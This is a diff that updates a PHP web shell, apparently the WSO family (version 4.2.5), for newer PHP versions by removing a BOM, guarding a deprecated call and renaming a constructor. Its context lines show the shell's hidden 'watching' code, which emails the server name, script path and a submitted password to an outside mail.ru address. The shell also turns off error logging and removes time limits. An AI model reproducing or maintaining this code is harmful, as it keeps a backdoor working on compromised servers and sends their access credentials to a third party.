@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 /*--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'SMS', $tmp); // Edit or delete!
@@ -26,7 +26,9 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-@set_magic_quotes_runtime(0);
+if(function_exists('set_magic_quotes_runtime')){
+	@set_magic_quotes_runtime(0);
+}
 @define('VERSION', '4.2.5');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
@@ -1238,7 +1240,7 @@ function actionSql() {
 		var $type;
 		var $link;
 		var $res;
-		function DbClass($type)	{
+		function __construct($type)	{
 			$this->type = $type;
 		}
 		function connect($host, $user, $pass, $dbname){
